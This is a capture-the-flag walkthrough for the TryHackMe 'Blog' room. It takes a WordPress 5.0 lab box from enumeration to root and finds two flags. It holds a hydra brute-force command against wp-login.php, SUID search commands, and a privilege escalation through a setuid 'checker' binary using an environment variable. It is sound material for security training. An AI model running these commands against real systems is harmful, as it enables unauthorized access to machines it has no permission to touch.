---
description: Walkthrough (Medium)
---

# Blog 🟠🟠

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

In order to get the blog to work with AWS, you'll need to add MACHINE\_IP blog.thm to your /etc/hosts file.

[https://tryhackme.com/r/room/blog](https://tryhackme.com/r/room/blog)

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

### Q ) What CMS was Billy using?

\-> wordpress

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### Q ) What version of the above CMS was being used?

\-> 5.0

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* After surfing the webpages got a user Karen Wheelar nickname : kwheel
* Found login page /wp-login.php ( lets hydra it)

{% code overflow="wrap" %}
```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.11.47 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```
{% endcode %}

* login: kwheel password: \*\*\*\*\*\*\*\*
* After google searching **wordpress 5.0 exploit** got **WordPress Crop-image Shell Upload**

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

* got user bjoel and there was a file user.txt but its a rabbit hole
* No flag files were found in the begining so just  **find root acces files with SUID**

```bash
find / -user root -perm /4000 2>/dev/null

               OR
               
find / -perm -u=s -type f 2>/dev/null 
```

* &#x20;**find root acces files with SUID**

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* Found a intrsting file Checker&#x20;

```bash
ltrace /usr/sbin/checker
```

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

* If we run it prints  " Not an Admin "
* If we see the code carefully, its checking environment variable admin true or false
* If it is false prints not admin, if set true then shell will be given

```bash
export admin=1
/usr/sbin/checker
```

* Now we are root, perform any task

### Q ) root.txt&#x20;

```basic
cat /root/root.txt
```

### Q ) user.txt

```bash
find / 2>/dev/null | grep user.txt
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### Q ) Where was user.txt found?

\-> /media/usb
